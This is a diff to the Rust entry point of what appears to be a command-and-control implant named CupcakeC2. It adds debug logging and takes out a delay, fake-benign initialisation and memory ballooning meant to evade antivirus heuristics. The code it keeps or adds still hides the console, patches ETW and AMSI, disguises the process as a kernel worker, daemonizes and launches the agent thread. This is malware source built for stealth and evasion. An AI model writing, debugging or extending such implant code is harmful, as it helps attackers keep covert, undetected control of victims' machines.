@@ -13,12 +13,15 @@
 // - 可修补的服务器配置
 
 // Windows: Enabled for debugging
-#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+// #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
  
   #[allow(unused_imports)]
   use cupcake_core::{Result, stealth};
   #[allow(unused_imports)]
   use log::info;
+
+  #[cfg(target_os = "windows")]
+  use winapi::um::{combaseapi::CoInitializeEx, objbase::COINIT_MULTITHREADED};
  
  #[cfg(target_os = "linux")]
 fn daemonize() {
@@ -56,9 +59,37 @@ fn main() {
     #[cfg(target_os = "linux")]
     daemonize();
 
-    // 💥 Global Panic Hook: Verbose in debugging
+    // 🔍 Early diagnostic check
+    let logging_enabled = std::env::var("RUST_LOG").is_ok() || cfg!(debug_assertions);
+
+    if logging_enabled {
+        #[cfg(target_os = "windows")]
+        stealth::setup_diagnostic_console();
+
+        // 🚀 Initialize env_logger to capture log::* output
+        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
+
+        // 🛡️ Direct print check (Independent of logger)
+        println!("========================================");
+        println!("[!] CupcakeC2 Runtime Bootstrap Started");
+        println!("[+] Logging: ENABLED");
+        println!("[+] Architecture: {}", std::env::consts::ARCH);
+        if let Ok(output) = std::process::Command::new("cmd").args(&["/C", "ver"]).output() {
+            println!("[+] OS Version: {}", String::from_utf8_lossy(&output.stdout).trim());
+        }
+        println!("[+] RUST_LOG: {:?}", std::env::var("RUST_LOG").unwrap_or_default());
+        println!("========================================\n");
+        use std::io::Write;
+        let _ = std::io::stdout().flush();
+    }
+
+    // 💥 Global Panic Hook
     std::panic::set_hook(Box::new(|info| {
-        // Safe to leave as backup if redirected, or can be removed
+        log::error!("PANIC OCCURRED: {:?}", info);
+        eprintln!("========================================");
+        eprintln!("CRITICAL ERROR (PANIC):");
+        eprintln!("{:?}", info);
+        eprintln!("========================================");
     }));
 
     // Seed PRNG
@@ -68,37 +99,18 @@ fn main() {
     };
     cupcake_core::utils::seed_rng(seed);
     
-    let delay = (cupcake_core::utils::next_u32() % 4) + 1; 
-    std::thread::sleep(std::time::Duration::from_secs(delay as u64));
- 
-    // 1. [Benign] Initial pattern load (looks like config parsing)
-    for _ in 0..3 {
-        // Mock legitimate-looking initialization
-        cupcake_core::utils::junk_data_collector();
-        std::thread::sleep(std::time::Duration::from_millis(500));
+    // 🛡️ [Diagnostic] COM Initialization for PTY support
+    #[cfg(target_os = "windows")]
+    unsafe {
+        CoInitializeEx(std::ptr::null_mut(), COINIT_MULTITHREADED);
     }
 
-    // 2. [Anti-Analysis & Evasion] Stealthy Memory Ballooning
-    // Allocate memory progressively to avoid triggering local AV memory-spike heuristics.
-    {
-        let mut _balloon: Vec<Vec<u8>> = Vec::new();
-        let mut allocated = 0;
-        let target = 2 * 1024 * 1024; // 2MB Light ballooning
-        
-        while allocated < target {
-            let chunk_size = (cupcake_core::utils::next_u32() % (512 * 1024) + 256 * 1024) as usize;
-            let mut chunk = vec![0u8; chunk_size];
-            for i in (0..chunk_size).step_by(8192) {
-                chunk[i] = (i % 255) as u8;
-            }
-            _balloon.push(chunk);
-            allocated += chunk_size;
-            std::thread::sleep(std::time::Duration::from_millis(10));
-        }
+    // 3. [Debug] DON'T Hide Console if logging is active
+    if !logging_enabled {
+        stealth::hide_console();
+    } else {
+        log::info!("Stealth: hide_console() skipped due to active logging");
     }
-
-    // 3. [Debug] DON'T Hide Console -> NOW HIDE
-    stealth::hide_console();
 
     // 4. [Anti-Analysis] Patch ETW and AMSI (Windows only)
     #[cfg(target_os = "windows")]
@@ -113,20 +125,22 @@ fn main() {
         stealth::spoof_process_name("kworker/u2:1-events");
     }
 
-    // 5. Extra Stabilization 
-    std::thread::sleep(std::time::Duration::from_millis(3000));
-
     // 11. Spawn agent runtime thread
     #[cfg(target_os = "windows")]
     {
         unsafe extern "system" fn agent_thread_proc(_: *mut winapi::ctypes::c_void) -> u32 {
             let rt = match tokio::runtime::Runtime::new() {
                     Ok(r) => r,
-                    Err(_) => return 1,
+                    Err(e) => {
+                        cupcake_core::utils::db_print(&format!("[FATAL] Failed to create tokio runtime: {}", e));
+                        return 1;
+                    }
                 };
 
             rt.block_on(async {
-                let _ = run().await;
+                if let Err(e) = run().await {
+                    cupcake_core::utils::db_print(&format!("[FATAL] Agent run loop failed: {:?}", e));
+                }
             });
             
             0
